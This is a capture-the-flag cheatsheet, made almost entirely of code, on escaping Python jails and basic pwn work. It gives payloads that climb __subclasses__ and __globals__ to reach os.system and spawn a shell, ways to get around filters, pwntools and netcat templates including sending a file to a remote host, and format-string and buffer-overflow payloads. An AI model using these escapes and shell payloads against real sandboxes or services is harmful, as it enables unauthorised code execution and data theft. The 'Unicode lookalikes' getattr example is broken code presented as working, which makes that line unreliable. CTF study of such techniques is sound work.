# Pwn / Python Jail Cheatsheet

## Python Jail Escapes

### Blacklist Bypass

```python
# Access os via sys.modules
sys.modules['os'].system('cat flag.txt')
sys.modules[input()].system(input())

# Subclass method
().__class__.__base__.__subclasses__()

# Find specific class
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Quitter']

# Access globals via class
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == 'Quitter'][0].__init__.__globals__['sys'].modules['os'].system('ls')
```

### String Construction

```python
# Using chr()
chr(111)+chr(115)  # "os"

# Using bytes
bytes([111,115]).decode()  # "os"

# Using format
f"{111:c}{115:c}"  # "os"
```

### Useful Classes to Look For

```python
# Find all subclasses
for i, cls in enumerate(().__class__.__base__.__subclasses__()):
    print(i, cls.__name__)

# Common useful classes:
# - Quitter (has sys reference)
# - catch_warnings (has linecache reference)
# - _wrap_close (has os reference)
```

### Bypassing Filters

```python
# No quotes - use input()
eval(input())

# No import - use __builtins__
__builtins__.__import__('os')

# No underscores - use getattr
getattr(getattr((), 'Ƈlass'), 'Ƀase')  # Unicode lookalikes

# No brackets - use __getitem__
dict.__getitem__(sys.modules, 'os')
```

### One-Liners

```python
# Get shell
__import__('os').system('sh')

# Read file
open('flag.txt').read()
print(open('flag.txt').read())

# Eval/exec from input
eval(input())
exec(input())
```

## Pwntools Basics

```python
from pwn import *

# Connection
p = process('./binary')      # Local
p = remote('host', port)     # Remote

# Send/Receive
p.send(b'data')
p.sendline(b'data')          # With newline
p.sendafter(b':', b'data')
p.sendlineafter(b':', b'data')

p.recv()
p.recvline()
p.recvuntil(b'flag')
p.recvall()

# Interactive shell
p.interactive()
```

## Netcat Commands

```bash
# Connect
nc host port

# Listen
nc -lvp port

# File transfer
nc host port < file
nc -lvp port > file
```

## Common Vulnerabilities

### Format String

```python
# Leak stack
%x %x %x %x
%p %p %p %p

# Read at position
%7$s
%7$p

# Write
%n
%7$n
```

### Buffer Overflow

```python
from pwn import *

offset = 40
payload = b'A' * offset
payload += p64(target_address)

p.sendline(payload)
```

## Useful Python Tricks

```python
# Check what's available
dir()
dir(__builtins__)
vars()
help()

# Get module attributes
getattr(module, 'function')
module.__dict__

# Bypass simple filters
'o'+'s'  # String concatenation
''.join(['o','s'])  # Join
```

## Sandbox Detection

```python
# Check environment
import sys
print(sys.version)
print(sys.modules.keys())
print(dir(__builtins__))

# Check what's blocked
try:
    import os
except:
    print("os blocked")
```

## Quick Reference

| Technique | Use Case |
|-----------|----------|
| `sys.modules` | Access loaded modules |
| `__subclasses__()` | Find useful classes |
| `__globals__` | Access function globals |
| `input()` | Bypass string filters |
| `chr()` | Construct strings without quotes |
| `getattr()` | Access attributes dynamically |

## Debugging Tips

```python
# Print what you have access to
print([x for x in dir() if not x.startswith('_')])

# Check if module is loaded
'os' in sys.modules

# List all subclasses with index
for i, c in enumerate(().__class__.__base__.__subclasses__()):
    if 'os' in str(c.__init__.__globals__.keys()):
        print(i, c)
```
